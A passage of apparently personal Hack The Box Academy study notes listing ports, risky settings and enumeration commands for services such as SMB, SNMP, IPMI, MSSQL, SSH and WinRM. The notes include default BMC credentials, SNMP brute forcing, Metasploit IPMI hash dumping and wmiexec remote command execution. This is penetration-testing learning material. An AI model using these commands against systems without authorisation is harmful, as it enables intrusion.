although SMTP can be used between a client and a server and between two SMTP servers.</p><p><strong>Ports</strong></p><ul><li>25 (TCP): This is the default SMTP non-encrypted port. It&rsquo;s widely used for SMTP relaying and communication between mail servers.</li><li>587 (TCP): Recommended for SMTP submission, especially for clients sending emails to a server. It supports STARTTLS, allowing encryption.</li><li>465 (TCP): Originally intended for SMTPS (SMTP over SSL), but was never standardized. Some systems still use it for SMTP with SSL/TLS encryption from the start of the connection.</li></ul><table><thead><tr><th style=text-align:left>Command</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>AUTH PLAIN</code></td><td style=text-align:left>AUTH is a service extension used to authenticate the client.</td></tr><tr><td style=text-align:left><code>HELO</code></td><td style=text-align:left>The client logs in with its computer name and thus starts the session.</td></tr><tr><td style=text-align:left><code>MAIL FROM</code></td><td style=text-align:left>The client names the email sender.</td></tr><tr><td style=text-align:left><code>RCPT TO</code></td><td style=text-align:left>The client names the email recipient.</td></tr><tr><td style=text-align:left><code>DATA</code></td><td style=text-align:left>The client initiates the transmission of the email.</td></tr><tr><td style=text-align:left><code>RSET</code></td><td style=text-align:left>The client aborts the initiated transmission but keeps the connection between client and server.</td></tr><tr><td style=text-align:left><code>VRFY</code></td><td style=text-align:left>The client checks if a mailbox is available for message transfer.</td></tr><tr><td style=text-align:left><code>EXPN</code></td><td style=text-align:left>The client also checks if a mailbox is available for messaging with this command.</td></tr><tr><td style=text-align:left><code>NOOP</code></td><td style=text-align:left>The client requests a response from the server to prevent disconnection due to time-out.</td></tr><tr><td style=text-align:left><code>QUIT</code></td><td style=text-align:left>The client terminates the session.</td></tr></tbody></table><p><strong>SMTP Tools</strong></p><ul><li>smtp-user-enum</li><li>telnet</li></ul><h3 id=imap--pop3>IMAP / POP3<a hidden class=anchor aria-hidden=true href=#imap--pop3>#</a></h3><p>With the help of the Internet Message Access Protocol (IMAP), access to emails from a mail server is possible. Unlike the Post Office Protocol (POP3), IMAP allows online management of emails directly on the server and supports folder structures. Thus, it is a network protocol for the online management of emails on a remote server. The protocol is client-server-based and allows synchronization of a local email client with the mailbox on the server, providing a kind of network file system for emails, allowing problem-free synchronization across several independent clients. POP3, on the other hand, does not have the same functionality as IMAP, and it only provides listing, retrieving, and deleting emails as functions at the email server. Therefore, protocols such as IMAP must be used for additional functionalities such as hierarchical mailboxes directly at the mail server, access to multiple mailboxes during a session, and preselection of emails.</p><p><strong>Ports</strong></p><ul><li>110 (TCP): POP3 (Standard) Used for retrieving emails with the Post Office Protocol version 3 (POP3) in a non-encrypted form.</li><li>143 (TCP): IMAP (Standard) Utilized for accessing emails using the Internet Message Access Protocol (IMAP) without encryption.</li><li>993 (TCP): IMAP over SSL/TLS (Secure) For accessing emails via IMAP securely using SSL/TLS encryption.</li><li>995 (TCP): POP3 over SSL/TLS (Secure) Used for secure email retrieval using POP3 with SSL/TLS encryption.</li></ul><p><strong>IMAP Tools</strong></p><ul><li>evolution</li><li>curl</li><li>openssl</li></ul><h3 id=snmp>SNMP<a hidden class=anchor aria-hidden=true href=#snmp>#</a></h3><p>Simple Network Management Protocol (SNMP) is a widely used protocol for managing devices on IP networks. It&rsquo;s used for collecting information from, and configuring, network devices such as servers, printers, switches, routers, and more.</p><p><strong>Ports</strong></p><ul><li>161 (UDP): The main port used by SNMP for sending and receiving requests.</li><li>162 (UDP): This port is used for SNMP traps. Traps are alerts or notifications sent from an SNMP-enabled device to a management station.</li></ul><p><strong>MIB</strong></p><p>To ensure that SNMP access works across manufacturers and with different client-server combinations, the Management Information Base (MIB) was created. MIB is an independent format for storing device information. A MIB is a text file in which all queryable SNMP objects of a device are listed in a standardized tree hierarchy. It contains at least one Object Identifier (OID), which, in addition to the necessary unique address and a name, also provides information about the type, access rights, and a description of the respective object. MIB files are written in the Abstract Syntax Notation One (ASN.1) based ASCII text format. The MIBs do not contain data, but they explain where to find which information and what it looks like, which returns values for the specific OID, or which data type is used.</p><p><strong>OID</strong></p><p>An OID represents a node in a hierarchical namespace. A sequence of numbers uniquely identifies each node, allowing the node&rsquo;s position in the tree to be determined. The longer the chain, the more specific the information. Many nodes in the OID tree contain nothing except references to those below them. The OIDs consist of integers and are usually concatenated by dot notation.</p><p><strong>Dangerous Settings</strong></p><table><thead><tr><th style=text-align:left>Settings</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left>rwuser noauth</td><td style=text-align:left>Provides access to the full OID tree without authentication.</td></tr><tr><td style=text-align:left>rwcommunity &lt;community string> &lt;IPv4 address></td><td style=text-align:left>Provides access to the full OID tree regardless of where the requests were sent from.</td></tr><tr><td style=text-align:left>rwcommunity6 &lt;community string> &lt;IPv6 address></td><td style=text-align:left>Same access as with rwcommunity with the difference of using IPv6.</td></tr></tbody></table><p><strong>SNMP Tools</strong></p><ul><li>SNMPwalk</li><li>OneSixtyOne</li><li>Braa</li></ul><h3 id=mysql>MySQL<a hidden class=anchor aria-hidden=true href=#mysql>#</a></h3><p>MySQL is a popular open-source relational database management system (RDBMS). It&rsquo;s widely used for a variety of applications, from small personal projects to large enterprise systems.</p><p><strong>Ports</strong></p><ul><li>3306 (TCP): This is the default port used by MySQL. When a client connects to a MySQL server, it typically uses this port.</li></ul><p><strong>Dangerous Settings</strong></p><table><thead><tr><th style=text-align:left>Settings</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left>user</td><td style=text-align:left>Sets which user the MySQL service will run as.</td></tr><tr><td style=text-align:left>password</td><td style=text-align:left>Sets the password for the MySQL user.</td></tr><tr><td style=text-align:left>admin_address</td><td style=text-align:left>The IP address on which to listen for TCP/IP connections on the administrative network interface.</td></tr><tr><td style=text-align:left>debug</td><td style=text-align:left>This variable indicates the current debugging settings.</td></tr><tr><td style=text-align:left>sql_warnings</td><td style=text-align:left>This variable controls whether single-row INSERT statements produce an information string if warnings occur.</td></tr><tr><td style=text-align:left>secure_file_priv</td><td style=text-align:left>This variable is used to limit the effect of data import and export operations.</td></tr></tbody></table><p><strong>Key Commands</strong></p><table><thead><tr><th style=text-align:left>Command</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>mysql -u &lt;user> -p&lt;password> -h &lt;IP address></code></td><td style=text-align:left>Connect to the MySQL server. There should not be a space between the &lsquo;-p&rsquo; flag, and the password.</td></tr><tr><td style=text-align:left><code>show databases;</code></td><td style=text-align:left>Show all databases.</td></tr><tr><td style=text-align:left><code>use &lt;database>;</code></td><td style=text-align:left>Select one of the existing databases.</td></tr><tr><td style=text-align:left><code>show tables;</code></td><td style=text-align:left>Show all available tables in the selected database.</td></tr><tr><td style=text-align:left><code>show columns from &lt;table>;</code></td><td style=text-align:left>Show all columns in the selected database.</td></tr><tr><td style=text-align:left><code>select * from &lt;table>;</code></td><td style=text-align:left>Show everything in the desired table.</td></tr><tr><td style=text-align:left><code>select * from &lt;table> where &lt;column> = "&lt;string>";</code></td><td style=text-align:left>Search for needed string in the desired table.</td></tr></tbody></table><h3 id=mssql>MSSQL<a hidden class=anchor aria-hidden=true href=#mssql>#</a></h3><p>Microsoft SQL Server (MSSQL) is a relational database management system developed by Microsoft. It&rsquo;s designed to store, retrieve, and manage data for various software applications.</p><p><strong>Ports</strong></p><ul><li>1433 (TCP): Default port for the SQL Server database engine.</li><li>1434 (TCP): Used for SQL Server named instances and the SQL Server Browser Service.</li></ul><p><strong>Default Databases</strong></p><table><thead><tr><th style=text-align:left>Default System Database</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left>master</td><td style=text-align:left>Tracks all system information for an SQL server instance</td></tr><tr><td style=text-align:left>model</td><td style=text-align:left>Template database that acts as a structure for every new database created. Any setting changed in the model database will be reflected in any new database created after changes to the model database</td></tr><tr><td style=text-align:left>msdb</td><td style=text-align:left>The SQL Server Agent uses this database to schedule jobs & alerts</td></tr><tr><td style=text-align:left>tempdb</td><td style=text-align:left>Stores temporary objects</td></tr><tr><td style=text-align:left>resource</td><td style=text-align:left>Read-only database containing system objects included with SQL server</td></tr></tbody></table><p><strong>Tools</strong></p><ul><li>nmap</li><li>msfconsole (scanner/mssql/mssql_ping)</li><li>mssqlclient.py</li><li>dbeaver</li></ul><h3 id=ipmi>IPMI<a hidden class=anchor aria-hidden=true href=#ipmi>#</a></h3><p>Intelligent Platform Management Interface (IPMI) is a standardized computer system interface used for out-of-band management of computer systems and monitoring of their operation. It allows system administrators to manage systems remotely and monitor system health, even in the absence of an operating system or when the system is powered off. Systems that use the IPMI protocol are called Baseboard Management Controllers (BMCs). Gaining access to a BMC is nearly equivalent to physical access to a system.</p><p><strong>Ports</strong></p><ul><li>623 (UDP/TCP): The default port used for IPMI. It&rsquo;s used for remote management and monitoring.</li></ul><p><strong>BMC Default Credentials</strong>
Product Username Password</p><table><thead><tr><th style=text-align:left>Product</th><th style=text-align:left>Username</th><th style=text-align:left>Password</th></tr></thead><tbody><tr><td style=text-align:left>Dell iDRAC</td><td style=text-align:left><code>root</code></td><td style=text-align:left><code>calvin</code></td></tr><tr><td style=text-align:left>HP iLO</td><td style=text-align:left><code>Administrator</code></td><td style=text-align:left>randomized 8-character string consisting of numbers and uppercase letters</td></tr><tr><td style=text-align:left>Supermicro IPMI</td><td style=text-align:left><code>ADMIN</code></td><td style=text-align:left><code>ADMIN</code></td></tr></tbody></table><p><strong>Tools</strong></p><ul><li>nmap</li><li>msfconsole (scanner/ipmi/ipmi_version, scanner/ipmi/ipmi_dumphashes)</li></ul><h3 id=ssh>SSH<a hidden class=anchor aria-hidden=true href=#ssh>#</a></h3><p>Secure Shell (SSH) is a cryptographic network protocol used for secure data communication, remote command-line login, remote command execution, and other secure network services between two networked computers.</p><p><strong>Ports</strong></p><ul><li>22 (TCP): The default port used for SSH connections.</li></ul><p><strong>Dangerous Settings</strong></p><table><thead><tr><th style=text-align:left>Setting</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left>PasswordAuthentication yes</td><td style=text-align:left>Allows password-based authentication.</td></tr><tr><td style=text-align:left>PermitEmptyPasswords yes</td><td style=text-align:left>Allows the use of empty passwords.</td></tr><tr><td style=text-align:left>PermitRootLogin yes</td><td style=text-align:left>Allows to log in as the root user.</td></tr><tr><td style=text-align:left>Protocol 1</td><td style=text-align:left>Uses an outdated version of encryption.</td></tr><tr><td style=text-align:left>X11Forwarding yes</td><td style=text-align:left>Allows X11 forwarding for GUI applications.</td></tr><tr><td style=text-align:left>AllowTcpForwarding yes</td><td style=text-align:left>Allows forwarding of TCP ports.</td></tr><tr><td style=text-align:left>PermitTunnel</td><td style=text-align:left>Allows tunneling.</td></tr><tr><td style=text-align:left>DebianBanner yes</td><td style=text-align:left>Displays a specific banner when logging in.</td></tr></tbody></table><p><strong>Tools</strong></p><ul><li>ssh-audit.py</li></ul><h3 id=rsync>Rsync<a hidden class=anchor aria-hidden=true href=#rsync>#</a></h3><p>Rsync is a utility for efficiently transferring and synchronizing files across computer systems, using a data streaming technique to minimize data transfer.</p><p><strong>Ports</strong></p><ul><li>873 (TCP/UDP): The default port used for Rsync services.</li></ul><p><strong>Tools</strong></p><ul><li>nmap</li><li>nc</li><li>rsync</li></ul><h3 id=r-services>R-Services<a hidden class=anchor aria-hidden=true href=#r-services>#</a></h3><p>R-Services refers to a suite of services for remote command execution, typically used in UNIX and Linux environments. These include Rlogin, Rsh, and Rexec.</p><p><strong>Ports</strong></p><ul><li>514 (TCP/UDP): Used for Rsh (Remote Shell).</li><li>513 (TCP/UDP): Used for Rlogin (Remote Login).</li><li>512 (TCP): Used for Rexec (Remote Execution).</li></ul><p><strong>Commands</strong></p><table><thead><tr><th style=text-align:left>Command</th><th style=text-align:left>Service Daemon</th><th style=text-align:left>Port</th><th style=text-align:left>Transport Protocol</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>rcp</code></td><td style=text-align:left>rshd</td><td style=text-align:left>514</td><td style=text-align:left>TCP</td><td style=text-align:left>Copy a file or directory bidirectionally from the local system to the remote system (or vice versa) or from one remote system to another. It works like the cp command on Linux but provides no warning to the user for overwriting existing files on a system.</td></tr><tr><td style=text-align:left><code>rsh</code></td><td style=text-align:left>rshd</td><td style=text-align:left>514</td><td style=text-align:left>TCP</td><td style=text-align:left>Opens a shell on a remote machine without a login procedure. Relies upon the trusted entries in the /etc/hosts.equiv and .rhosts files for validation.</td></tr><tr><td style=text-align:left><code>rexec</code></td><td style=text-align:left>rexecd</td><td style=text-align:left>512</td><td style=text-align:left>TCP</td><td style=text-align:left>Enables a user to run shell commands on a remote machine. Requires authentication through the use of a username and password through an unencrypted network socket. Authentication is overridden by the trusted entries in the /etc/hosts.equiv and .rhosts files.</td></tr><tr><td style=text-align:left><code>rlogin</code></td><td style=text-align:left>rlogind</td><td style=text-align:left>513</td><td style=text-align:left>TCP</td><td style=text-align:left>Enables a user to log in to a remote host over the network. It works similarly to telnet but can only connect to Unix-like hosts. Authentication is overridden by the trusted entries in the /etc/hosts.equiv and .rhosts files.</td></tr></tbody></table><h3 id=rdp>RDP<a hidden class=anchor aria-hidden=true href=#rdp>#</a></h3><p>Remote Desktop Protocol (RDP) is a proprietary protocol developed by Microsoft, providing a user with a graphical interface to connect to another computer over a network connection.</p><p><strong>Ports</strong></p><ul><li>3389 (TCP/UDP): The default port used for RDP connections.</li></ul><p><strong>RDP Tools</strong></p><ul><li>nmap</li><li>xfreerdp</li><li>rdesktop</li><li>remmina</li></ul><h3 id=windows-remote-management-winrm>Windows Remote Management (WinRM)<a hidden class=anchor aria-hidden=true href=#windows-remote-management-winrm>#</a></h3><p>Windows Remote Management (WinRM) is Microsoft&rsquo;s implementation of the WS-Management protocol, a standard web services protocol used for remote software and hardware management.</p><p><strong>Ports</strong></p><ul><li>5985 (TCP): Used for HTTP connections.</li><li>5986 (TCP): Used for HTTPS connections.</li></ul><p><strong>WinRM Tools</strong></p><ul><li>Test-WsMan</li><li>evil-winrm</li></ul><h3 id=wmi>WMI<a hidden class=anchor aria-hidden=true href=#wmi>#</a></h3><p>Windows Management Instrumentation (WMI) is a set of extensions to the Windows Driver Model that provides an operating system interface through which instrumented components provide information and notification.</p><p><strong>Ports</strong></p><ul><li>135 (TCP): The default port used for WMI connections.</li></ul><p><strong>WMI Tools</strong></p><ul><li>wmiexec.py</li></ul><h3 id=infrastructure-based-enumeration-cheatsheet>Infrastructure-based Enumeration Cheatsheet<a hidden class=anchor aria-hidden=true href=#infrastructure-based-enumeration-cheatsheet>#</a></h3><table><thead><tr><th style=text-align:left>Command</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>curl -s https://crt.sh/\?q\=&lt;target-domain>\&amp;output\=json | jq .</code></td><td style=text-align:left>Certificate transparency.</td></tr><tr><td style=text-align:left><code>for i in $(cat ip-addresses.txt);do shodan host $i;done</code></td><td style=text-align:left>Scan each IP address in a list using Shodan.</td></tr></tbody></table><h3 id=host-based-enumeration-cheatsheet>Host-based Enumeration Cheatsheet<a hidden class=anchor aria-hidden=true href=#host-based-enumeration-cheatsheet>#</a></h3><p><strong>FTP</strong></p><table><thead><tr><th style=text-align:left>Command</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>ftp &lt;FQDN/IP></code></td><td style=text-align:left>Interact with the FTP service on the target.</td></tr><tr><td style=text-align:left><code>nc -nv &lt;FQDN/IP> 21</code></td><td style=text-align:left>Interact with the FTP service on the target.</td></tr><tr><td style=text-align:left><code>telnet &lt;FQDN/IP> 21</code></td><td style=text-align:left>Interact with the FTP service on the target.</td></tr><tr><td style=text-align:left><code>openssl s_client -connect &lt;FQDN/IP>:21 -starttls ftp</code></td><td style=text-align:left>Interact with the FTP service on the target using encrypted connection.</td></tr><tr><td style=text-align:left><code>wget -m --no-passive ftp://anonymous:anonymous@&lt;target></code></td><td style=text-align:left>Download all available files on the target FTP server.</td></tr></tbody></table><p><strong>SMB</strong></p><table><thead><tr><th style=text-align:left>Command</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>smbclient -N -L //&lt;FQDN/IP></code></td><td style=text-align:left>Null session authentication on SMB.</td></tr><tr><td style=text-align:left><code>smbclient //&lt;FQDN/IP>/&lt;share></code></td><td style=text-align:left>Connect to a specific SMB share.</td></tr><tr><td style=text-align:left><code>rpcclient -U "" &lt;FQDN/IP></code></td><td style=text-align:left>Interaction with the target using RPC.</td></tr><tr><td style=text-align:left><code>samrdump.py &lt;FQDN/IP></code></td><td style=text-align:left>Username enumeration using Impacket scripts.</td></tr><tr><td style=text-align:left><code>smbmap -H &lt;FQDN/IP></code></td><td style=text-align:left>Enumerating SMB shares.</td></tr><tr><td style=text-align:left><code>crackmapexec smb &lt;FQDN/IP> --shares -u '' -p ''</code></td><td style=text-align:left>Enumerating SMB shares using null session authentication.</td></tr><tr><td style=text-align:left><code>enum4linux-ng.py &lt;FQDN/IP> -A</code></td><td style=text-align:left>SMB enumeration using enum4linux.</td></tr></tbody></table><p><strong>NFS</strong></p><table><thead><tr><th style=text-align:left>Command</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>showmount -e &lt;FQDN/IP></code></td><td style=text-align:left>Show available NFS shares.</td></tr><tr><td style=text-align:left><code>mount -t nfs &lt;FQDN/IP>:/&lt;share> ./target-NFS/ -o nolock</code></td><td style=text-align:left>Mount the specific NFS share.umount ./target-NFS</td></tr><tr><td style=text-align:left><code>umount ./target-NFS</code></td><td style=text-align:left>Unmount the specific NFS share.</td></tr></tbody></table><p><strong>DNS</strong></p><table><thead><tr><th style=text-align:left>Command</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>dig ns &lt;domain.tld> @&lt;nameserver></code></td><td style=text-align:left>NS request to the specific nameserver.</td></tr><tr><td style=text-align:left><code>dig any &lt;domain.tld> @&lt;nameserver></code></td><td style=text-align:left>ANY request to the specific nameserver.</td></tr><tr><td style=text-align:left><code>dig axfr &lt;domain.tld> @&lt;nameserver></code></td><td style=text-align:left>AXFR request to the specific nameserver.</td></tr><tr><td style=text-align:left><code>dnsenum --dnsserver &lt;nameserver> --enum -p 0 -s 0 -o found_subdomains.txt -f ~/subdomains.list &lt;domain.tld></code></td><td style=text-align:left>Subdomain brute forcing.</td></tr></tbody></table><p><strong>SMTP</strong></p><table><thead><tr><th style=text-align:left>Command</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>telnet &lt;FQDN/IP> 25</code></td><td style=text-align:left></td></tr></tbody></table><p><strong>IMAP/POP3</strong></p><table><thead><tr><th style=text-align:left>Command</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>curl -k 'imaps://&lt;FQDN/IP>' --user &lt;user>:&lt;password></code></td><td style=text-align:left>Log in to the IMAPS service using cURL.</td></tr><tr><td style=text-align:left><code>openssl s_client -connect &lt;FQDN/IP>:imaps</code></td><td style=text-align:left>Connect to the IMAPS service.</td></tr><tr><td style=text-align:left><code>openssl s_client -connect &lt;FQDN/IP>:pop3s</code></td><td style=text-align:left>Connect to the POP3s service.</td></tr></tbody></table><p><strong>SNMP</strong></p><table><thead><tr><th style=text-align:left>Command</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>snmpwalk -v2c -c &lt;community string> &lt;FQDN/IP></code></td><td style=text-align:left>Querying OIDs using snmpwalk.</td></tr><tr><td style=text-align:left><code>onesixtyone -c community-strings.list &lt;FQDN/IP></code></td><td style=text-align:left>Bruteforcing community strings of the SNMP service.</td></tr><tr><td style=text-align:left><code>braa &lt;community string>@&lt;FQDN/IP>:.1.*</code></td><td style=text-align:left>Bruteforcing SNMP service OIDs.</td></tr></tbody></table><p><strong>MySQL</strong></p><table><thead><tr><th style=text-align:left>Command</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>mysql -u &lt;user> -p&lt;password> -h &lt;FQDN/IP></code></td><td style=text-align:left>Login to the MySQL server.</td></tr></tbody></table><p><strong>MSSQL</strong></p><table><thead><tr><th style=text-align:left>Command</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>mssqlclient.py &lt;user>@&lt;FQDN/IP> -windows-auth</code></td><td style=text-align:left>Log in to the MSSQL server using Windows authentication.</td></tr></tbody></table><p><strong>IPMI</strong></p><table><thead><tr><th style=text-align:left>Command</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>msf6 auxiliary(scanner/ipmi/ipmi_version)</code></td><td style=text-align:left>IPMI version detection.</td></tr><tr><td style=text-align:left><code>msf6 auxiliary(scanner/ipmi/ipmi_dumphashes)</code></td><td style=text-align:left>Dump IPMI hashes.</td></tr></tbody></table><p><strong>Linux Remote Management</strong></p><table><thead><tr><th style=text-align:left>Command</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>ssh-audit.py &lt;FQDN/IP></code></td><td style=text-align:left>Remote security audit against the target SSH service.</td></tr><tr><td style=text-align:left><code>ssh &lt;user>@&lt;FQDN/IP></code></td><td style=text-align:left>Log in to the SSH server using the SSH client.</td></tr><tr><td style=text-align:left><code>ssh -i private.key &lt;user>@&lt;FQDN/IP></code></td><td style=text-align:left>Log in to the SSH server using private key.</td></tr><tr><td style=text-align:left><code>ssh &lt;user>@&lt;FQDN/IP> -o PreferredAuthentications=password</code></td><td style=text-align:left>Enforce password-based authentication.</td></tr></tbody></table><p><strong>Windows Remote Management</strong></p><table><thead><tr><th style=text-align:left>Command</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>rdp-sec-check.pl &lt;FQDN/IP></code></td><td style=text-align:left>Check the security settings of the RDP service.</td></tr><tr><td style=text-align:left><code>xfreerdp /u:&lt;user> /p:"&lt;password>" /v:&lt;FQDN/IP></code></td><td style=text-align:left>Log in to the RDP server from Linux.</td></tr><tr><td style=text-align:left><code>evil-winrm -i &lt;FQDN/IP> -u &lt;user> -p &lt;password></code></td><td style=text-align:left>Log in to the WinRM server.</td></tr><tr><td style=text-align:left><code>wmiexec.py &lt;user>:"&lt;password>"@&lt;FQDN/IP> "&lt;system command>"</code></td><td style=text-align:left>Execute command using the WMI service.</td></tr></tbody></table><p><strong>Oracle TNS</strong></p><table><thead><tr><th style=text-align:left>Command</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>./odat.py all -s &lt;FQDN/IP></code></td><td style=text-align:left>Perform a variety of scans to gather information about the Oracle database services and its components.</td></tr><tr><td style=text-align:left><code>sqlplus &lt;user>/&lt;pass>@&lt;FQDN/IP>/&lt;db></code></td><td style=text-align:left>Log in to the Oracle database.</td></tr><tr><td style=text-align:left><code>./odat.py utlfile -s &lt;FQDN/IP> -d &lt;db> -U &lt;user> -P &lt;pass> --sysdba --putFile C:\\insert\\path file.txt ./file.txt</code></td><td style=text-align:left>Upload a file with Oracle RDBMS.</td></tr></tbody></table><h3 id=complete-3>Complete<a hidden class=anchor aria-hidden=true href=#complete-3>#</a></h3><p><a href=https://academy.hackthebox.com/achievement/713396/112 title="Link of Completion" target=_blank rel="nofollow noopener">Link of Completion</a></p><p> </p><hr><p> </p><h2 id=information-gathering>Information Gathering<a hidden class=anchor aria-hidden=true href=#information-gathering>#</a></h2><h3 id=whois>WHOIS<a hidden class=anchor aria-hidden=true href=#whois>#</a></h3><p>We can consider WHOIS as the &ldquo;white pages&rdquo; for domain names. It is a TCP-based transaction-oriented query/response protocol listening on TCP port 43 by default</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ <span class=nb>export</span> <span class=nv>TARGET</span><span class=o>=</span><span class=s2>&#34;facebook.com&#34;</span> <span class=c1># Assign our target to an environment variable</span>
</span></span><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ whois <span class=nv>$TARGET</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Domain Name: FACEBOOK.COM
</span></span><span class=line><span class=cl>Registry Domain ID: 2320948_DOMAIN_COM-VRSN
</span></span><span class=line><span class=cl>Registrar WHOIS Server: whois.registrarsafe.com
</span></span><span class=line><span class=cl>Registrar URL: https://www.registrarsafe.com
</span></span><span class=line><span class=cl>Updated Date: 2021-09-22T19:33:41Z
</span></span><span class=line><span class=cl>Creation Date: 1997-03-29T05:00:00Z
</span></span><span class=line><span class=cl>Registrar Registration Expiration Date: 2030-03-30T04:00:00Z
</span></span><span class=line><span class=cl>Registrar: RegistrarSafe, LLC
</span></span><span class=line><span class=cl>Registrar IANA ID: <span class=m>3237</span>
</span></span><span class=line><span class=cl>Registrar Abuse Contact Email: abusecomplaints@registrarsafe.com
</span></span><span class=line><span class=cl>Registrar Abuse Contact Phone: +1.6503087004
</span></span><span class=line><span class=cl>Domain Status: clientDeleteProhibited https://www.icann.org/epp#clientDeleteProhibited
</span></span><span class=line><span class=cl>Domain Status: clientTransferProhibited https://www.icann.org/epp#clientTransferProhibited
</span></span><span class=line><span class=cl>Domain Status: clientUpdateProhibited https://www.icann.org/epp#clientUpdateProhibited
</span></span><span class=line><span class=cl>Domain Status: serverDeleteProhibited https://www.icann.org/epp#serverDeleteProhibited
</span></span><span class=line><span class=cl>Domain Status: serverTransferProhibited https://www.icann.org/epp#serverTransferProhibited
</span></span><span class=line><span class=cl>Domain Status: serverUpdateProhibited https://www.icann.org/epp#serverUpdateProhibited
</span></span><span class=line><span class=cl>Registry Registrant ID:
</span></span><span class=line><span class=cl>Registrant Name: Domain Admin
</span></span><span class=line><span class=cl>Registrant Organization: Facebook, Inc.
</span></span><span class=line><span class=cl>Registrant Street: <span class=m>1601</span> Willow Rd
</span></span><span class=line><span class=cl>Registrant City: Menlo Park
</span></span><span class=line><span class=cl>Registrant State/Province: CA
</span></span><span class=line><span class=cl>Registrant Postal Code: <span class=m>94025</span>
</span></span><span class=line><span class=cl>Registrant Country: US
</span></span><span class=line><span class=cl>Registrant Phone: +1.6505434800
</span></span><span class=line><span class=cl>Registrant Phone Ext:
</span></span><span class=line><span class=cl>Registrant Fax: +1.6505434800
</span></span><span class=line><span class=cl>Registrant Fax Ext:
</span></span><span class=line><span class=cl>Registrant Email: domain@fb.com
</span></span><span class=line><span class=cl>Registry Admin ID:
</span></span><span class=line><span class=cl>Admin Name: Domain Admin
</span></span><span class=line><span class=cl>Admin Organization: Facebook, Inc.
</span></span><span class=line><span class=cl>Admin Street: <span class=m>1601</span> Willow Rd
</span></span><span class=line><span class=cl>Admin City: Menlo Park
</span></span><span class=line><span class=cl>Admin State/Province: CA
</span></span><span class=line><span class=cl>Admin Postal Code: <span class=m>94025</span>
</span></span><span class=line><span class=cl>Admin Country: US
</span></span><span class=line><span class=cl>Admin Phone: +1.6505434800
</span></span><span class=line><span class=cl>Admin Phone Ext:
</span></span><span class=line><span class=cl>Admin Fax: +1.6505434800
</span></span><span class=line><span class=cl>Admin Fax Ext:
</span></span><span class=line><span class=cl>Admin Email: domain@fb.com
</span></span><span class=line><span class=cl>Registry Tech ID:
</span></span><span class=line><span class=cl>Tech Name: Domain Admin
</span></span><span class=line><span class=cl>Tech Organization: Facebook, Inc.
</span></span><span class=line><span class=cl>Tech Street: <span class=m>1601</span> Willow Rd
</span></span><span class=line><span class=cl>Tech City: Menlo Park
</span></span><span class=line><span class=cl>Tech State/Province: CA
</span></span><span class=line><span class=cl>Tech Postal Code: <span class=m>94025</span>
</span></span><span class=line><span class=cl>Tech Country: US
</span></span><span class=line><span class=cl>Tech Phone: +1.6505434800
</span></span><span class=line><span class=cl>Tech Phone Ext:
</span></span><span class=line><span class=cl>Tech Fax: +1.6505434800
</span></span><span class=line><span class=cl>Tech Fax Ext:
</span></span><span class=line><span class=cl>Tech Email: domain@fb.com
</span></span><span class=line><span class=cl>Name Server: C.NS.FACEBOOK.COM
</span></span><span class=line><span class=cl>Name Server: B.NS.FACEBOOK.COM
</span></span><span class=line><span class=cl>Name Server: A.NS.FACEBOOK.COM
</span></span><span class=line><span class=cl>Name Server: D.NS.FACEBOOK.COM
</span></span><span class=line><span class=cl>DNSSEC: unsigned
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;SNIP&gt;
</span></span></code></pre></div><h3 id=dns-1>DNS<a hidden class=anchor aria-hidden=true href=#dns-1>#</a></h3><p>The DNS is the Internet&rsquo;s phone book. Domain names such as hackthebox.com and inlanefreight.com allow people to access content on the Internet. Internet Protocol (IP) addresses are used to communicate between web browsers. DNS converts domain names to IP addresses, allowing browsers to access resources on the Internet.</p><p>DNS Advantages:</p><ul><li>It allows names to be used instead of numbers to identify hosts.</li><li>It is a lot easier to remember a name than it is to recall a number.</li><li>By merely retargeting a name to the new numeric address, a server can change numeric addresses without having to notify everyone on the Internet.</li><li>A single name might refer to several hosts splitting the workload between different servers.</li></ul><h3 id=passive-subdomain-enumeration>Passive Subdomain Enumeration<a hidden class=anchor aria-hidden=true href=#passive-subdomain-enumeration>#</a></h3><p><strong>VirusTotal</strong></p><p>VirusTotal maintains its DNS replication service, which is developed by preserving DNS resolutions made when users visit URLs given by them. To receive information about a domain, type the domain name into the search bar and click on the &ldquo;Relations&rdquo; tab.</p><p><strong>Certificates</strong></p><p>Another interesting source of information we can use to extract subdomains is SSL/TLS certificates. The main reason is Certificate Transparency (CT), a project that requires every SSL/TLS certificate issued by a Certificate Authority (CA) to be published in a publicly accessible log.</p><p>We will learn how to examine CT logs to discover additional domain names and subdomains for a target organization using two primary resources:</p><ul><li><p><a href=https://censys.io title=https://censys.io target=_blank rel="nofollow noopener">https://censys.io</a></p></li><li><p><a href=https://crt.sh title=https://crt.sh target=_blank rel="nofollow 